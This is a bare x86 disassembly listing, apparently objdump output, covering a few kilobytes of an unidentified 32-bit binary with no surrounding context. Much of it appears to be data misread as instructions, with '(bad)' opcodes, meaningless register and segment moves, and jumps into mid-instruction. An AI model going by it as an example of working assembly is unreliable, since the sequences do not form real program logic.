  4218c6:	mov    ds:0x304e3a4f,al
  4218cb:	dec    esi
  4218cc:	inc    esp
  4218cd:	dec    esi
  4218ce:	pop    esp
  4218cf:	fstp   QWORD PTR [edi-0x2e]
  4218d2:	outs   dx,DWORD PTR ds:[esi]
  4218d3:	loop   0x421943
  4218d5:	jecxz  0x421955
  4218d7:	repz jns 0x4218ca
  4218da:	aas    
  4218db:	dec    esi
  4218dc:	lea    ecx,[edi+0x30]
  4218df:	dec    esi
  4218e0:	lahf   
  4218e1:	dec    edi
  4218e2:	cmp    eax,0x3c4fa04e
  4218e7:	dec    esi
  4218e8:	xor    BYTE PTR [esi+0x3f],cl
  4218eb:	dec    esi
  4218ec:	pop    esp
  4218ed:	in     eax,dx
  4218ee:	pop    edi
  4218ef:	loop   0x421960
  4218f1:	repnz outs dx,BYTE PTR ds:[esi]
  4218f3:	repz jle 0x4218f9
  4218f6:	jns    0x4218f8
  4218f8:	jle    0x42190d
  4218fa:	jns    0x42190c
  4218fc:	cmp    al,0x4e
  4218fe:	jg     0x42194e
  421900:	xor    BYTE PTR [esi-0x65],cl
  421903:	dec    edi
  421904:	xor    cl,BYTE PTR [esi-0x80]
  421907:	dec    edi
  421908:	cmp    al,0x4e
  42190a:	lods   eax,DWORD PTR ds:[esi]
  42190b:	dec    edi
  42190c:	cmp    ecx,DWORD PTR [esi+0x30]
  42190f:	dec    esi
  421910:	inc    ebp
  421911:	dec    esi
  421912:	pop    esp
  421913:	or     eax,0x126f025f
  421918:	outs   dx,BYTE PTR ds:[esi]
  421919:	adc    edi,DWORD PTR [esi+0x23]
  42191c:	jns    0x42193e
  42191e:	aas    
  42191f:	dec    esi
  421920:	add    BYTE PTR [eax],al
  421922:	stos   BYTE PTR es:[edi],al
  421923:	pop    ss
  421924:	inc    edx
  421925:	add    BYTE PTR [esi-0x59ffbde7],bl
  42192b:	sbb    DWORD PTR [edx+0x0],eax
  42192e:	dec    esi
  42192f:	sbb    eax,DWORD PTR [edx+0x0]
  421932:	mov    edx,0x3e00421a
  421937:	sbb    eax,DWORD PTR [edx+0x0]
  42193a:	xchg   BYTE PTR [ecx],bl
  42193c:	inc    edx
  42193d:	add    BYTE PTR [edx+0x3a004219],cl
  421943:	sbb    eax,DWORD PTR [edx+0x0]
  421946:	out    dx,al
  421947:	sbb    DWORD PTR [edx+0x0],eax
  42194a:	or     eax,0x36f89ca9
  42194f:	mov    edx,0x19a2f89c
  421954:	inc    edx
  421955:	add    BYTE PTR [edx+0x1a],dh
  421958:	inc    edx
  421959:	add    BYTE PTR [esi-0x6dffbde6],al
  42195f:	sbb    al,BYTE PTR [edx+0x0]
  421962:	mov    ds:0xda00421a,al
  421967:	sbb    DWORD PTR [edx+0x0],eax
  42196a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42196b:	pop    ss
  42196c:	inc    edx
  42196d:	add    dl,bh
  42196f:	sbb    DWORD PTR [edx+0x0],eax
  421972:	jmp    0x421b:0x52004219
  421979:	add    BYTE PTR [esi+0x19f89c85],dh
  42197f:	or     edx,DWORD PTR [edi]
  421981:	sub    DWORD PTR [esi+0x14004219],0x881161c
  42198b:	or     eax,0x705
  421990:	inc    eax
  421991:	add    BYTE PTR [edx],bh
  421993:	inc    edx
  421994:	ds ds enter 0x4279,0x0
  42199a:	ins    DWORD PTR es:[edi],dx
  42199b:	push   ebp
  42199c:	inc    esp
  42199d:	imul   ecx,DWORD PTR [eax],0x86275fa
  4219a3:	in     eax,dx
  4219a4:	inc    BYTE PTR [edi]
  4219a6:	aas    
  4219a7:	cli    
  4219a8:	mov    ds:0x42199605,eax
  4219ad:	add    BYTE PTR [ebp-0x4a07636b],dh
  4219b3:	xchg   esi,eax
  4219b4:	pushf  
  4219b5:	clc    
  4219b6:	mov    ah,0x95
  4219b8:	pushf  
  4219b9:	clc    
  4219ba:	mov    ebx,0xbaf89c95
  4219bf:	xchg   ebp,eax
  4219c0:	pushf  
  4219c1:	clc    
  4219c2:	mov    ecx,0xb8f89c95
  4219c7:	xchg   ebp,eax
  4219c8:	pushf  
  4219c9:	clc    
  4219ca:	mov    edi,0xbef89c95
  4219cf:	xchg   ebp,eax
  4219d0:	pushf  
  4219d1:	clc    
  4219d2:	mov    ebp,0xa6f89c95
  4219d7:	xchg   ebp,eax
  4219d8:	pushf  
  4219d9:	clc    
  4219da:	jmp    0x4217:0x9e6003f9
  4219e1:	add    BYTE PTR [eax+eax*2+0x42],ch
  4219e5:	add    BYTE PTR [ebx+0x77],dl
  4219e8:	jbe    0x421a3a
  4219ea:	mov    dh,0x85
  4219ec:	pushf  
  4219ed:	clc    
  4219ee:	sbb    ecx,ebp
  4219f0:	push   eax
  4219f1:	pop    es
  4219f2:	dec    eax
  4219f3:	or     al,BYTE PTR [eax]
  4219f5:	add    BYTE PTR [edx+0x1b004217],bl
  4219fb:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421a2e:	ins    BYTE PTR es:[edi],dx
  421a2f:	inc    eax
  421a30:	inc    edx
  421a31:	add    BYTE PTR [esi+0x66f89c85],dh
  421a37:	add    BYTE PTR [edx+0x0],ch
  421a3a:	add    BYTE PTR [si+0x0],ah
  421a3e:	push   0x64006700
  421a43:	add    BYTE PTR [esi+0x0],ah
  421a46:	push   0x0
  421a48:	push   0x66006400
  421a4d:	add    BYTE PTR [edi+0x0],ah
  421a50:	push   0x0
  421a52:	push   0x66006700
  421a57:	add    BYTE PTR [eax+0x0],ch
  421a5a:	add    BYTE PTR [bp+0x0],ah
  421a5e:	push   0x66006700
	...
  421a6b:	add    BYTE PTR [eax],al
  421a6d:	add    BYTE PTR [edi+0x5c],ch
  421a70:	inc    eax
  421a71:	add    BYTE PTR [ebp-0x5db060b1],ah
  421a77:	dec    edi
  421a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a79:	dec    edi
  421a7a:	lahf   
  421a7b:	dec    edi
  421a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a7d:	dec    edi
  421a7e:	ins    DWORD PTR es:[edi],dx
  421a7f:	dec    esi
  421a80:	bound  ecx,QWORD PTR [esi+0x30]
  421a83:	dec    esi
  421a84:	add    BYTE PTR [eax],al
  421a86:	cdq    
  421a87:	dec    edi
  421a88:	pushf  
  421a89:	dec    edi
  421a8a:	fwait
  421a8b:	dec    edi
  421a8c:	ins    DWORD PTR es:[edi],dx
  421a8d:	dec    esi
  421a8e:	bound  ecx,QWORD PTR [esi+0x30]
  421a91:	dec    esi
  421a92:	scas   eax,DWORD PTR es:[edi]
  421a93:	dec    edi
  421a94:	lods   eax,DWORD PTR ds:[esi]
  421a95:	dec    edi
  421a96:	lahf   
  421a97:	dec    edi
  421a98:	mov    ds:0x624e6d4f,al
  421a9d:	dec    esi
  421a9e:	xor    BYTE PTR [esi+0x0],cl
  421aa1:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421aa7:	dec    edi
  421aa8:	test   eax,0xa04f934f
  421aad:	dec    edi
  421aae:	fwait
  421aaf:	dec    edi
  421ab0:	xor    BYTE PTR [esi+0x0],cl
  421ab3:	add    BYTE PTR [eax],al
  421ab5:	add    BYTE PTR [eax],al
  421ab7:	add    BYTE PTR [eax],al
  421ab9:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421ac0:	mov    WORD PTR [ebp-0x32734274],gs
  421ac6:	mov    ebp,ds
  421ac8:	mov    ebp,gs
  421aca:	mov    ebp,?
  421acc:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421ad2:	mov    WORD PTR ds:0x6d8c5d8c,?
  421ad8:	mov    WORD PTR [edx-0x74],?
  421adb:	jae    0x421a69
  421add:	jo     0x421a6b
  421adf:	jno    0x421a6d
  421ae1:	jbe    0x421a6f
  421ae3:	ja     0x421a71
  421ae5:	je     0x421a73
  421ae7:	jne    0x421a75
  421ae9:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421af0:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421af6:	lods   al,BYTE PTR ds:[esi]
  421af7:	jge    0x421ab5
  421af9:	jge    0x421a99
  421afb:	(bad)  
  421afc:	jns    0x421b71
  421afe:	mov    ecx,0x7d738cb1
  421b03:	ins    DWORD PTR es:[edi],dx
  421b04:	enter  0x9fc6,0x26
  421b08:	jb     0x421b0d
  421b0a:	test   eax,0xb956bb17
  421b0f:	hlt    
  421b10:	test   al,0x37
  421b12:	test   al,0x7e
  421b14:	fnstenv [ecx-0x6a]
  421b17:	mov    cl,0x6a
  421b19:	push   0xffffffce
  421b1b:	or     BYTE PTR [edx],bl
  421b1d:	xlat   BYTE PTR ds:[ebx]
  421b1e:	out    dx,eax
  421b1f:	add    eax,0x9321d7aa
  421b24:	scas   al,BYTE PTR es:[edi]
  421b25:	adc    DWORD PTR [esi],esp
  421b27:	jge    0x421b4c
  421b29:	fidiv  WORD PTR [edi]
  421b2b:	leave  
  421b2c:	hlt    
  421b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b2e:	cmp    ax,0x1fc8
  421b32:	mov    dh,cl
  421b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b35:	(bad)  
  421b36:	and    DWORD PTR [eax],ebx
  421b38:	and    DWORD PTR [ecx-0x18],esi
  421b3b:	(bad)  [ebx+0x7]
  421b3e:	cmc    
  421b3f:	enter  0x301a,0x14
  421b43:	inc    eax
  421b44:	inc    edx
  421b45:	add    BYTE PTR [ecx+0x66],dh
  421b48:	jp     0x421bb8
  421b4a:	mov    ds,WORD PTR [ecx]
  421b4c:	inc    edx
  421b4d:	add    dl,dh
  421b4f:	sbb    DWORD PTR [edx+0x0],eax
  421b52:	or     ch,ch
  421b54:	adc    al,BYTE PTR [edi]
  421b56:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421b5d:	ins    BYTE PTR es:[edi],dx
  421b5e:	push   0x49657557
  421b63:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421b69:	push   edi
  421b6a:	jp     0x421be6
  421b6c:	dec    ebp
  421b6d:	push   esi
  421b6e:	arpl   WORD PTR gs:[ecx+0x45],si
  421b72:	dec    edx
  421b73:	dec    esi
  421b74:	data16 ja 0x421bc5
  421b77:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421b92:	inc    ebp
  421b93:	push   edx
  421b94:	jb     0x421c0a
  421b96:	inc    esi
  421b97:	je     0x421bda
  421b99:	inc    esi
  421b9a:	jae    0x421c12
  421b9c:	dec    ebx
  421b9d:	gs dec ecx
  421b9f:	dec    ebp
  421ba0:	dec    ebp
  421ba1:	pop    edx
  421ba2:	jp     0x421bfe
  421ba4:	jbe    0x421bec
  421ba6:	pop    ecx
  421ba7:	jo     0x421c21
  421ba9:	inc    edi
  421baa:	gs ins BYTE PTR es:[edi],dx
  421bac:	dec    esp
  421bad:	js     0x421c17
  421baf:	inc    edx
  421bb0:	js     0x421bf8
  421bb2:	dec    eax
  421bb3:	inc    ebp
  421bb4:	inc    esp
  421bb5:	inc    esp
  421bb6:	push   ecx
  421bb7:	dec    edx
  421bb8:	ins    BYTE PTR es:[edi],dx
  421bb9:	dec    ebx
  421bba:	jbe    0x421c2a
  421bbc:	pop    eax
  421bbd:	jbe    0x421c0a
  421bbf:	inc    ecx
  421bc0:	fs gs jno 0x421c31
  421bc4:	push   ebx
  421bc5:	inc    ecx
  421bc6:	add    BYTE PTR [eax],al
  421bc8:	inc    ebx
  421bc9:	outs   dx,BYTE PTR ds:[esi]
  421bca:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421bce:	push   edx
  421bcf:	push   ecx
  421bd0:	push   0x74000064
  421bd5:	jne    0x421c4c
  421bd7:	ins    DWORD PTR es:[edi],dx
  421bd8:	push   ecx
  421bd9:	push   eax
  421bda:	jo     0x421c56
  421bdc:	addr16 jo 0x421c35
  421bdf:	pop    eax
  421be0:	add    BYTE PTR [eax],al
  421be2:	push   ecx
  421be3:	pop    ecx
  421be4:	inc    ebx
  421be5:	inc    edx
  421be6:	outs   dx,BYTE PTR ds:[esi]
  421be7:	popa   
  421be8:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421bec:	jne    0x421c5c
  421bee:	dec    ebx
  421bef:	je     0x421c54
  421bf1:	bound  esp,QWORD PTR [edi+0x0]
  421bf4:	jns    0x421c3b
  421bf6:	bound  ebp,QWORD PTR [ecx+0x46]
  421bf9:	dec    ecx
  421bfa:	ja     0x421c41
  421bfc:	dec    eax
  421bfd:	inc    ebp
  421bfe:	inc    edx
  421bff:	push   ebx
  421c00:	add    BYTE PTR [eax],al
  421c02:	outs   dx,DWORD PTR ds:[esi]
  421c03:	inc    edi
  421c04:	dec    esi
  421c05:	outs   dx,DWORD PTR ds:[esi]
  421c06:	pop    ecx
  421c07:	inc    edi
  421c08:	jb     0x421c51
  421c0a:	jns    0x421c82
  421c0c:	inc    ecx
  421c0d:	pop    eax
  421c0e:	dec    esp
  421c0f:	add    BYTE PTR [eax+0x48],bh
  421c12:	bound  edx,QWORD PTR [ebx+0x43]
  421c15:	pop    eax
  421c16:	outs   dx,DWORD PTR ds:[esi]
  421c17:	push   0x4355
  421c1c:	dec    esp
  421c1d:	ins    BYTE PTR es:[edi],dx
  421c1e:	inc    edx
  421c1f:	push   0x76666a73
  421c24:	inc    edx
  421c25:	jo     0x421c27
  421c27:	add    BYTE PTR [eax],al
  421c29:	add    BYTE PTR [edi+0x6d],ah
  421c2c:	je     0x421c75
  421c2e:	ins    BYTE PTR es:[edi],dx
  421c2f:	jae    0x421c9b
  421c31:	inc    esi
  421c32:	ins    DWORD PTR es:[edi],dx
  421c33:	je     0x421c8b
  421c35:	push   0x56584178
  421c3a:	push   ebx
  421c3b:	addr16 dec edx
  421c3d:	jo     0x421cb1
  421c3f:	js     0x421cb0
  421c41:	pop    eax
  421c42:	dec    ebx
  421c43:	push   esp
  421c44:	dec    esp
  421c45:	jns    0x421c92
  421c47:	js     0x421cc1
  421c49:	outs   dx,BYTE PTR ds:[esi]
  421c4a:	pop    ecx
  421c4b:	jae    0x421cbb
  421c4d:	push   0x43644448
  421c52:	arpl   WORD PTR [edx+0x55],sp
  421c55:	push   0x42504e67
  421c5a:	push   ebp
  421c5b:	je     0x421cd2
  421c5d:	addr16 dec edi
  421c5f:	dec    esp
  421c60:	inc    edx
  421c61:	ins    DWORD PTR es:[edi],dx
  421c62:	inc    esi
  421c63:	inc    esi
  421c64:	inc    esi
  421c65:	arpl   WORD PTR [edx+0x47],bx
  421c68:	push   ebp
  421c69:	inc    ebx
  421c6a:	popa   
  421c6b:	push   edx
  421c6c:	dec    esp
  421c6d:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421c74:	push   ecx
  421c75:	push   ebx
  421c76:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421c7d:	dec    edx
  421c7e:	jns    0x421ce9
  421c80:	push   edx
  421c81:	inc    ebx
  421c82:	jo     0x421cf9
  421c84:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421c88:	fs push ebx
  421c8a:	inc    ebx
  421c8b:	push   ebp
  421c8c:	push   eax
  421c8d:	ja     0x421cca
  421c8f:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421c93:	mov    ebp,0xa53ddffb
  421c98:	js     0x421c53
  421c9a:	pop    es
  421c9b:	mov    BYTE PTR [eax+0x1d50739],bl
  421ca1:	add    BYTE PTR [edx+0x0],bl
  421ca4:	add    BYTE PTR [eax],al
  421ca6:	cmp    ecx,ebx
  421ca8:	sahf   
  421ca9:	push   ebp
  421caa:	lock jge 0x421d1e
  421cad:	repz arpl bp,si
  421cb0:	xor    BYTE PTR [ecx],bh
  421cb2:	pop    ebx
  421cb3:	mov    ds,WORD PTR [eax-0x25]
  421cb6:	add    ebp,0x76
  421cb9:	das    
  421cba:	pop    ecx
  421cbb:	jl     0x421c5f
  421cbd:	mov    WORD PTR [ebx+0x3b],fs
  421cc0:	adc    DWORD PTR [edi],eax
  421cc2:	dec    esi
  421cc3:	inc    edi
  421cc4:	clc    
  421cc5:	cs mov bh,0x4d
  421cc8:	sub    DWORD PTR [edx+esi*2+0x72a9f0bd],edx
  421ccf:	nop
  421cd0:	adc    ecx,DWORD PTR [edx-0x32c28b4d]
  421cd6:	gs pop es
  421cd8:	mov    esi,0x496485af
  421cdd:	test   eax,0x6fa6cb28
  421ce2:	cmc    
  421ce3:	out    0x50,eax
  421ce5:	sbb    ebx,DWORD PTR [edx+0x7]
  421ce8:	popf   
  421ce9:	mov    eax,0xa3bf27ad
  421cee:	ret    
  421cef:	inc    ecx
  421cf0:	pop    edx
  421cf1:	nop
  421cf2:	jo     0x421d6b
  421cf4:	mov    ch,0xac
  421cf6:	jmp    0xfc4cab10
  421cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cfc:	cmp    bl,dl
  421cfe:	(bad)  
	...
  421d0c:	add    BYTE PTR [eax],al
  421d0e:	sub    BYTE PTR [edx+0x57bf52a5],dh
  421d14:	(bad)  
  421d15:	cli    
  421d16:	jl     0x421d7c
  421d18:	xlat   BYTE PTR ds:[ebx]
  421d19:	push   esi
  421d1a:	loop   0x421d94
  421d1c:	push   ds
  421d1d:	je     0x421d80
  421d1f:	aad    0x1
  421d21:	add    BYTE PTR [edx+0x0],bl
  421d24:	add    BYTE PTR [eax],al
  421d26:	inc    edi
  421d27:	and    eax,0xb07b1d01
  421d2c:	stos   BYTE PTR es:[edi],al
  421d2d:	stc    
  421d2e:	or     BYTE PTR [esi+0x3a],cl
  421d31:	stc    
  421d32:	retf   0xe979
  421d35:	pop    edi
  421d36:	push   ebx
  421d37:	call   0x1060945e
  421d3c:	pop    es
  421d3d:	mov    edi,0x999165f5
  421d42:	scas   al,BYTE PTR es:[edi]
  421d43:	mov    ebx,0x4da0f598
  421d48:	cmp    BYTE PTR fs:[eax-0x67],al
  421d4c:	lds    edi,FWORD PTR [esi+0x17]
  421d4f:	sub    al,0xb8
  421d51:	add    edi,DWORD PTR [ebp+0x4d5edae7]
  421d57:	sbb    edx,DWORD PTR [esi]
  421d59:	mov    al,ds:0xd0cfc240
  421d5e:	sti    
  421d5f:	push   ebx
  421d60:	pop    esp
  421d61:	push   edx
  421d62:	push   esp
  421d63:	dec    esi
  421d64:	mov    dh,0x8d
  421d66:	xchg   esp,eax
  421d67:	in     eax,0x6c
  421d69:	aam    0x67
  421d6b:	(bad)  
  421d6c:	mov    bh,0x33
  421d6e:	add    eax,0x3ebaf648
  421d73:	and    eax,0x817cfeb8
  421d78:	fldenv [eax+0x2]
  421d7b:	dec    ebx
  421d7c:	lods   eax,DWORD PTR ds:[esi]
  421d7d:	sbb    ebp,ecx
  421d7f:	stos   BYTE PTR es:[edi],al
	...
  421d8c:	add    BYTE PTR [eax],al
  421d8e:	mov    bl,0x55
  421d90:	jg     0x421d13
  421d92:	jmp    FWORD PTR [ebx-0x69418801]
  421d98:	push   0xd9aa3b57
  421d9d:	out    0xbb,eax
  421d9f:	aad    0x1
  421da1:	add    BYTE PTR [edx+0x0],bl
  421da4:	add    BYTE PTR [eax],al
  421da6:	test   DWORD PTR [ecx],0xc07341ee
  421dac:	push   edx
  421dad:	test   al,0x3f
  421daf:	and    eax,0xc8f48c45
  421db4:	jmp    0x421de0
  421db6:	ins    BYTE PTR es:[edi],dx
  421db7:	cmp    al,0xbc
  421db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dba:	call   DWORD PTR [ebp+ebx*1-0x20]
  421dbe:	and    ebp,DWORD PTR ds:0xfa0b575b
  421dc4:	mov    ?,ebp
  421dc6:	shl    BYTE PTR [eax],1
  421dc8:	scas   al,BYTE PTR es:[edi]
  421dc9:	or     esp,eax
  421dcb:	(bad)  
  421dcd:	aam    0xfb
  421dcf:	dec    ebx
  421dd0:	dec    BYTE PTR [ecx]
  421dd2:	add    dl,BYTE PTR [esi-0x4c]
  421dd5:	inc    eax
  421dd6:	xchg   ecx,eax
  421dd7:	shl    DWORD PTR [ebp-0x33761055],1
  421ddd:	cmp    eax,0x62c2d963
  421de2:	jae    0x421da4
  421de4:	xchg   eax,edx
  421de6:	imul   edi,ebp,0x3693dc3c
  421dec:	shr    BYTE PTR [esp+esi*2],1
  421def:	scas   eax,DWORD PTR es:[edi]
  421df0:	pop    es
  421df1:	pop    ds
  421df2:	(bad)  
  421df3:	xchg   ecx,eax
  421df4:	push   ecx
  421df5:	push   edi
  421df6:	dec    edi
  421df7:	push   es
  421df8:	push   es
  421df9:	scas   eax,DWORD PTR es:[edi]
  421dfa:	push   cs
  421dfb:	imul   BYTE PTR [edx]
  421dfd:	test   esi,ebp
  421dff:	inc    DWORD PTR [eax]
	...
  421e0d:	add    BYTE PTR [eax],bh
  421e0f:	(bad)  
  421e10:	cmp    ah,BYTE PTR [esi+edi*8]
  421e13:	in     al,dx
  421e14:	fimul  WORD PTR ds:[edi+0x6bac6bd5]
  421e1b:	test   cl,bl
  421e1d:	loope  0x421e34
  421e1f:	(bad)  
  421e20:	add    DWORD PTR [eax],eax
  421e22:	pop    edx
  421e23:	add    BYTE PTR [eax],al
  421e25:	add    dl,bl
  421e27:	sub    DWORD PTR [ebx+ebx*8-0x1c3be23b],esp
  421e2e:	or     DWORD PTR [ebp+0x3cc1adb4],edx
  421e34:	jb     0x421e62
  421e36:	mov    al,0x53
  421e38:	mov    ds:0x920b94f6,al
  421e3d:	rcr    BYTE PTR [ebx-0xf],cl
  421e40:	cli    
  421e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e42:	fisttp DWORD PTR [edi+0xb]
  421e45:	sbb    eax,ebx
  421e47:	adc    esi,DWORD PTR [edi-0x40e73757]
  421e4d:	push   ss
  421e4e:	or     ebp,edi
  421e50:	add    eax,0xca877088
  421e55:	aas    
  421e56:	ret    
  421e57:	mov    al,ds:0x112385d7
  421e5c:	jmp    0xf53c4cc9
  421e61:	xchg   DWORD PTR [ebx+0x6487aa30],esi
  421e67:	push   eax
  421e68:	in     al,0x2b
  421e6a:	dec    BYTE PTR [eax-0x7fab9a0c]
  421e70:	outs   dx,BYTE PTR ds:[esi]
  421e71:	sub    eax,0x98941b9d
  421e76:	aad    0x80
  421e78:	pop    esi
  421e79:	pushf  
  421e7a:	jae    0x421e01
  421e7c:	lea    esi,[ebx]
  421e7e:	sbb    ecx,DWORD PTR [eax+eax*1+0x0]
	...
  421e8e:	fnstenv [esi-0x2490e49a]
  421e94:	std    
  421e95:	neg    BYTE PTR [esi]
  421e97:	sub    esp,DWORD PTR [ebx-0x23]
  421e9a:	outs   dx,BYTE PTR ds:[esi]
  421e9b:	sbb    dl,al
  421e9d:	sub    ebp,DWORD PTR [edi-0x2a]
  421ea0:	add    DWORD PTR [eax],eax
  421ea2:	pop    edx
  421ea3:	add    BYTE PTR [eax],al
  421ea5:	add    BYTE PTR [ecx],ah
  421ea7:	cmp    al,0x33
  421ea9:	pop    ecx
  421eaa:	dec    edi
  421eab:	add    edx,edi
  421ead:	push   es
  421eae:	cdq    
  421eaf:	inc    ebp
  421eb0:	cmp    BYTE PTR [ebp-0x11],al
  421eb3:	xchg   edx,eax
  421eb4:	sub    al,0xf6
  421eb6:	sbb    ebp,esi
  421eb8:	test   eax,0x3e08d12b
  421ebd:	pop    ebp
  421ebe:	ss (bad) 
  421ec0:	pop    es
  421ec1:	sbb    eax,0xa005f0c
  421ec6:	scas   eax,DWORD PTR es:[edi]
  421ec7:	sub    edi,eax
  421ec9:	gs jp  0x421eb6
  421ecc:	inc    ebx
  421ecd:	and    dh,0x9e
  421ed0:	xor    esp,DWORD PTR [edx+0x59374121]
  421ed6:	dec    ebp
  421ed7:	adc    al,al
  421ed9:	and    al,BYTE PTR [eax]
  421edb:	pop    es
  421edc:	mov    ebp,0xad88fc1e
  421ee1:	xchg   edx,eax
  421ee2:	mov    ds:0xd39a8d32,al
  421ee7:	mov    ds:0xa621f5f4,al
  421eec:	sub    eax,0x26fdf480
  421ef1:	jnp    0x421f29
  421ef3:	mov    al,ds:0x2e06ae5b
  421ef8:	mov    BYTE PTR [ecx],ch
  421efa:	inc    edi
  421efb:	es je  0x421f4b
  421efe:	ss lahf 
	...
  421f0c:	add    BYTE PTR [eax],al
  421f0e:	fidiv  DWORD PTR [edx]
  421f10:	xchg   edi,eax
  421f11:	mov    bh,bh
  421f13:	scas   eax,DWORD PTR es:[edi]
  421f14:	fbstp  TBYTE PTR [edx+0x3]
  421f17:	inc    ebp
  421f18:	mov    ds:0xb89b5d5c,eax
  421f1d:	add    cl,cl
  421f1f:	(bad)  
  421f20:	add    DWORD PTR [eax],eax
  421f22:	pop    edx
  421f23:	add    BYTE PTR [eax],al
  421f25:	add    ch,dl
  421f27:	pop    ss
  421f28:	push   ds
  421f29:	xchg   edx,eax
  421f2a:	mov    DWORD PTR [eax],edx
  421f2c:	ret    0xd212
  421f2f:	(bad)  
  421f30:	nop
  421f31:	aam    0xe
  421f33:	dec    ebp
  421f34:	pop    ss
  421f35:	stos   DWORD PTR es:[edi],eax
  421f36:	cmp    eax,0x37664763
  421f3b:	ds mov eax,0x64d86fe8
  421f41:	lea    esp,[esi+ebp*8-0x4]
  421f45:	dec    esi
  421f46:	pop    esp
  421f47:	dec    esi
  421f48:	pop    eax
  421f49:	push   ebx
  421f4a:	test   al,0x80
  421f4c:	out    0xf7,eax
  421f4e:	mov    al,0x43
  421f50:	repnz mov edx,0x14bacf5e
  421f56:	cs cmp al,0xf4
  421f59:	(bad)  
  421f5a:	xor    eax,DWORD PTR [ecx]
  421f5c:	dec    esi
  421f5d:	push   esp
  421f5e:	push   cs
  421f5f:	xchg   ch,al
  421f61:	mov    eax,ds:0x6acc1c45
  421f66:	sbb    ebx,DWORD PTR [eax]
  421f68:	mov    BYTE PTR [edx],0x22
  421f6b:	popa   
  421f6c:	stc    
  421f6d:	mov    BYTE PTR [edi+ebx*4+0x74],ah
  421f71:	imul   esp,DWORD PTR [edi+0x177323a2],0xffffff8a
  421f78:	arpl   bx,bx
  421f7a:	loope  0x421f33
  421f7c:	imul   ebp,DWORD PTR [ecx],0xf17a
	...
  421f8e:	dec    eax
  421f8f:	in     al,0x3
  421f91:	fwait
  421f92:	scas   eax,DWORD PTR es:[edi]
  421f93:	(bad)  
  421f94:	fdiv   st,st(7)
  421f96:	pop    esi
  421f97:	sub    BYTE PTR [eax+0x16f9608f],bl
  421f9d:	push   0x23
  421f9f:	xlat   BYTE PTR ds:[ebx]
  421fa0:	add    DWORD PTR [eax],eax
  421fa2:	pop    edx
  421fa3:	add    BYTE PTR [eax],al
  421fa5:	add    BYTE PTR [eax-0x67],ah
  421fa8:	xchg   edx,ecx
  421faa:	or     DWORD PTR [ebp+0x4a],edx
  421fad:	sbb    ch,BYTE PTR [ebx+0x68322619]
  421fb3:	scas   al,BYTE PTR es:[di]
  421fb5:	or     DWORD PTR [ecx+0x2b],edi
  421fb8:	daa    
  421fb9:	pop    es
  421fba:	jb     0x421ff9
  421fbc:	ds lock push esi
  421fbf:	adc    DWORD PTR [ebx-0x6e13adb5],0xffffffa6
  421fc6:	mov    esi,0x5b719f3f
  421fcb:	addr16 mov eax,0x2ea7b978
  421fd1:	inc    ecx
  421fd2:	bound  esp,QWORD PTR ds:0xec53ff3d
  421fd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fd9:	and    BYTE PTR [edx],dl
  421fdb:	inc    edi
  421fdc:	test   al,0xe2
  421fde:	xchg   edx,eax
  421fdf:	dec    esp
  421fe0:	or     DWORD PTR [ebx],ebx
  421fe2:	outs   dx,BYTE PTR ds:[esi]
  421fe3:	adc    eax,0xf832fc56
  421fe8:	in     al,0xe4
  421fea:	adc    DWORD PTR [eax+0x15],edi
  421fed:	lods   al,BYTE PTR ds:[esi]
  421fee:	loop   0x422007
  421ff0:	mov    dl,BYTE PTR [edx+0x32]
  421ff3:	pop    ebp
  421ff4:	repz xor BYTE PTR [ebp+0x6c4d2ac9],bh
  421ffb:	cmp    al,BYTE PTR [eax+0x115cbf]
	...
  42200d:	add    BYTE PTR [edx+0x4],dl
  422010:	mov    ds:0x72a6f682,al
  422015:	aam    0x6d
  422017:	xor    dh,BYTE PTR [edx]
  422019:	and    eax,0x4c2a2308
  42201e:	jge    0x421ff7
  422020:	add    DWORD PTR [eax],eax
  422022:	pop    edx
  422023:	add    BYTE PTR [eax],al
  422025:	add    cl,ah
  422027:	or     eax,0x4b57d600
  42202c:	mov    eax,0x52e47844
  422031:	dec    ebp
  422032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422033:	dec    edi
  422034:	xchg   esp,eax
  422035:	out    dx,eax
  422036:	and    ah,ch
  422038:	add    al,0xb
  42203a:	ins    DWORD PTR es:[edi],dx
  42203b:	into   
  42203c:	mov    eax,DWORD PTR [edi-0x1de97033]
  422042:	es add ecx,eax
  422045:	push   ss
  422046:	js     0x422020
  422048:	sbb    DWORD PTR [eax-0x14],ecx
  42204b:	mov    edx,edx
  42204d:	add    BYTE PTR [ebp+esi*2-0x2661ed8e],0xb2
  422055:	push   ebp
  422056:	adc    DWORD PTR [esi-0x5d],0x18
  42205a:	mov    ebp,cs
  42205c:	pop    esi
  42205d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42205e:	(bad)  
  42205f:	dec    ebx
  422060:	ret    
  422061:	addr16 iret 
  422063:	adc    al,0x9
  422065:	or     DWORD PTR [ecx-0x4a4aad31],eax
  42206b:	int    0x8c
  42206d:	mov    ch,0x75
  42206f:	hlt    
  422070:	and    BYTE PTR ds:0x148c7b0a,dl
  422076:	cmp    edx,DWORD PTR [esi-0x2bef4ef0]
  42207c:	pop    esp
